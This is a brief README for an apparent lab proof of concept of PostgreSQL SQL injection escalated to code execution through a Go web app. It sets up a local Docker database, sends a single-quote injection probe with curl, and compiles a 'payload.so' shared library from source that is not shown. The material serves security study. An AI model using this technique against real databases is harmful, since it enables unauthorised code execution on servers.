### Setting up the server
1. Install the Postgresql Docker container
```
docker run --name poc-postgres-sqli-rce -e POSTGRES_PASSWORD=password -d postgres
```
2. Clone the repo and run this Go module
```
git clone https://github.com/adeadfed/psql-golang-rce-poc
cd psql-golang-rce-poc
go run poc
```

### SQLi PoC
```
curl http://localhost:8000/phrases?id=1'
```

### Compiling the shared library
1. Install correct dev dependencies for the major version of the vulnerable PSQL server
```
sudo apt install postgresql-13 postgresql-server-dev-13 -y 
```
2. Compile the lib with gcc
```
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
